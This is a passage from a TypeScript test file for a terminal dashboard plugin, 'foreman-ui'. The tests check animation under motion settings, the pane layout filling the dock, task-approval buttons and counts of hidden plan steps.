  expect(await ui.find({ type: 'Text', text: /^[▁▂▃▄▅▆▇█ ]+$/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /◉ executing/ })).toBeDefined()
  await ui.unmount()
})

const railFrames = async ($: Parameters<Parameters<typeof test>[1]>[0], on: On) => {
  const { answer, clock, blits } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  answer.hold = 2000
  void $.tool.call({ tool: 'Bash', command: 'make build', description: 'build' })
  await clock.advance(50)
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  const seen = new Set<string | undefined>()
  for (let i = 0; i < 8; i++) {
    seen.add(((await ui.findAll({ type: 'Raster' })).find(r => r.key === 'stage-rail')?.props as { cells?: string } | undefined)?.cells)
    await clock.advance(40)
  }
  const spinning = await ui.find({ type: 'Text', text: /^[·✢✳✶✻✽] Foreman$/ })
  await clock.advance(3000)
  await ui.unmount()
  return { seen: seen.size, spinning: !!spinning, blits: blits.length }
}

test('motion calm: the rail moves only with the 8 fps redraws, never by blit (T-0912)', { options: { motion: 'calm' } }, async ($, on) => {
  const { seen, blits } = await railFrames($, on)
  expect(seen).toBeGreaterThan(1)
  expect(blits).toBe(0)
})

test('motion off: nothing moves while work runs; the pane is still (T-0912)', { options: { motion: 'off' } }, async ($, on) => {
  const { seen, spinning, blits } = await railFrames($, on)
  expect(seen).toBe(1)
  expect(blits).toBe(0)
  expect(spinning).toBe(false) // the head shows ▍, not a spinner
})

test('a close takes the attention row for a moment: done with grade, proof and time, then it settles (T-0913)', async ($, on) => {
  const working = { ...VIEW, typical: { 'FIX/M': 25 }, active: { ...VIEW.active!, on_task_s: 22 * 60 } }
  const closed = { ...CALM, active: null, closed: [{ id: 'T-0007', status: 'done', title: 'Login times out', grade: 'strong', lenses: ['edge'] }] }
  const { clock } = world(on, [{ ...working, queue: CALM.queue }, closed])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ type: 'Text', text: /T-0007 done/ })).toBeUndefined()
  await ui.press({ key: 'refresh' })
  expect(await ui.find({ type: 'Text', text: /✔ T-0007 done · strong · edge · 1 criterion proven · 22m 00s · usually ~25m/ })).toBeDefined()
  expect((await ui.findAll({ type: 'Raster' })).some(r => r.key === 'closed-sweep')).toBe(true)
  await clock.advance(6500)
  expect(await ui.find({ type: 'Text', text: /T-0007 done/ })).toBeUndefined()
  expect(await ui.find({ type: 'Text', text: /✗ gates failing: bench/ })).toBeDefined() // what the done row stood in front of
  await ui.unmount()
})

const PLAN = (w: { task: number; queue: number; sessions: number }): Part[] => [
  { key: 'task', want: w.task, cap: 20, min: Math.min(w.task, 4), bare: true },
  { key: 'activity', want: 1, fixed: 7 },
  { key: 'today', want: 1, fixed: 6 },
  { key: 'queue', want: w.queue, cap: 12, min: 3 },
  { key: 'sessions', want: w.sessions, cap: 5 },
  { key: 'history', want: 24, stretch: true },
]
/** The rows a placed plan draws: the head and the controls (4), a blank row under the head and over the controls on a
 * tall dock, and for each titled section its divider and the blank row above it. */
const drawn = (parts: Part[], placed: ReturnType<typeof layout>) => {
  const shown = parts.filter(p => placed.rows[p.key]! > 0)
  return 4 + 2 * placed.gap + shown.reduce((n, p) => n + placed.rows[p.key]! + (p.bare ? 0 : 1 + placed.gap), 0)
}

test('the pane fills the dock exactly: titled dividers, room above each, the history takes what is left (T-1000, T-1002)', () => {
  for (let rows = 24; rows <= 120; rows++)
    for (const w of [{ task: 2, queue: 1, sessions: 0 }, { task: 9, queue: 4, sessions: 3 }, { task: 40, queue: 30, sessions: 5 }]) {
      const parts = PLAN(w)
      const placed = layout(rows, parts)
      expect(drawn(parts, placed)).toBe(rows) // no more, no less
      for (const p of parts) if (!p.stretch && !p.fixed && !p.bare) expect(placed.rows[p.key]!).toBeLessThanOrEqual(p.want) // no blank rows inside
      expect(layout(rows, parts)).toEqual(placed) // pure
    }
  const roomy = layout(50, PLAN({ task: 9, queue: 4, sessions: 0 }))
  expect(roomy.gap).toBe(1) // a tall dock gets a blank row above each divider
  expect(roomy.rows.history!).toBeGreaterThanOrEqual(5)
  expect(layout(34, PLAN({ task: 9, queue: 4, sessions: 0 })).gap).toBe(0) // a short one packs them
  const crowded = layout(40, PLAN({ task: 40, queue: 30, sessions: 5 }))
  expect(crowded.rows.task!).toBeGreaterThan(crowded.rows.queue!) // the task first
  expect(crowded.rows.activity!).toBe(7) // the charts keep their size
})

test('review (T-0989): every waiting plan keeps an approve button, hidden steps are counted', async ($, on) => {
  const second = { ...VIEW.queue![1]!, id: 'T-0010', title: 'JSON export' }
  const steps = Array.from({ length: 20 }, (_, i) => ({ n: i + 1, text: `step ${i + 1}`, done: i < 5, current: i === 5 }))
  const { calls } = world(on, [{
    ...VIEW,
    approvals: [{ task: 'T-0007', allow: ['core'], why: 'edit the guard' }], // the attention row is taken
    queue: [...VIEW.queue!, second],
    active: { ...VIEW.active!, steps },
    signals: [{ level: 'amber', text: 'usage ahead of pace' }],
  }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...tall(40) })
  for (const id of ['T-0009', 'T-0010']) expect(await ui.find({ key: `approve-${id}` })).toBeDefined()
  await ui.press({ key: 'approve-T-0010' })
  expect(calls).toContainEqual(['fm', 'task', 'set', 'T-0010', 'approved=true'])
  expect(await ui.find({ type: 'Text', text: /^… \d+ more$/ })).toBeDefined() // 20 steps in a capped task block
  await ui.unmount()
})

test('review (T-1002): a long plan to approve is counted, not cut; a short task block keeps the current step in view', async ($, on) => {
  const long = { ...VIEW.queue![1]!, plan: { ...VIEW.queue![1]!.plan!,
    steps: Array.from({ length: 10 }, (_, i) => ({ n: i + 1, text: `plan step ${i + 1}`, done: false, current: i === 0 })),
    criteria: Array.from({ length: 3 }, (_, i) => ({ n: i + 1, text: `plan check ${i + 1}`, verify: 'true', checked: false })) } }
  world(on, [{ ...VIEW, active: null, queue: [long] }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const plan = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...tall(30) })
  const rows = (await plan.find({ key: 'task' }))?.props.height as number
  expect(rows).toBeLessThan(16) // the plan doesn't fit
  expect(await plan.find({ type: 'Text', text: /^… \d+ more$/ })).toBeDefined() // and says so
  await plan.unmount()
})

test('review (T-1002): the current step stays in view however short the task block, and the count is of what is hidden', async ($, on) => {
  const steps = Array.from({ length: 20 }, (_, i) => ({ n: i + 1, text: `step ${i + 1}`, done: i < 5, current: i === 5 }))
  const plans = [2, 3, 4].map(n => ({ ...VIEW.queue![1]!, id: `T-00${20 + n}`, title: `plan ${n}` }))
  world(on, [{ ...VIEW, queue: [...VIEW.queue!, ...plans], active: { ...VIEW.active!, steps } }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  for (const h of [24, 30, 40]) {
    const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...tall(h) })
    expect(await ui.find({ type: 'Text', text: /step 6$/ })).toBeDefined() // the current one
    const shown = (await ui.findAll({ type: 'Text', text: /\d+  step \d+$/ })).length
    const more = await ui.find({ type: 'Text', text: /^… \d+ more$/ })
    expect([h, shown > 0, more?.props.children ?? more?.text]).toEqual([h, true, `… ${20 - shown} more`])
    await ui.unmount()
  }
})

test('review (T-1002): on a narrow dock Today keeps its four tanks whole and lets the days go', async ($, on) => {
  world(on, [{ ...VIEW, done_days: [0, 1, 0, 2, 0, 0, 0, 0, 3, 0, 0, 1, 0, 2], today_done: 2 }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  for (const cols of [44, 70]) {
    const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE, props: { ...PANE.props, bodyColumns: cols } })
    const rasters = await ui.findAll({ type: 'Raster' })
    const tanks = rasters.find(r => r.key === 'fm-tank-cells')!
    const pad = ((await ui.find({ key: 'fm-tanks' }))?.props.paddingLeft as number | undefined) ?? 0
    const days = rasters.find(r => r.key === 'done-days')
    const used = pad + (tanks.props.columns as number) + (days ? (days.props.columns as number) + 4 : 0)
    expect(used).toBeLessThanOrEqual(cols - 2)
    expect(!!days).toBe(cols >= 70)
    await ui.unmount()
  }
})

test('review (T-0989): with nothing urgent, a signal the band used to show takes the attention row', async ($, on) => {
  world(on, [{ ...CALM, checks: undefined, signals: [{ level: 'amber', text: 'usage ahead of pace' }] }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const calm = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await calm.find({ type: 'Text', text: /◐ usage ahead of pace/ })).toBeDefined()
  await calm.unmount()
})
